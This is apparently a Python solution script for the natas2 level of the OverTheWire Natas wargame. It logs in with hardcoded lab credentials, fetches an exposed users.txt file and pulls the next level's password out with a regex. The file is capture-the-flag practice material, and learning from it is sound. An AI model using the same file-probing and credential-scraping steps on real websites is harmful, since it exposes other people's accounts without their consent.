from pwn import *
import requests
import re
import html

username = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas3 password, Hold on! ")
session = requests.session()
web = session.get(url + "/files/users.txt", auth = (username, password)).text
#print(web)
print("The password for natas3 is === " + re.findall("[A-Za-z0-9]{32}", web)[0])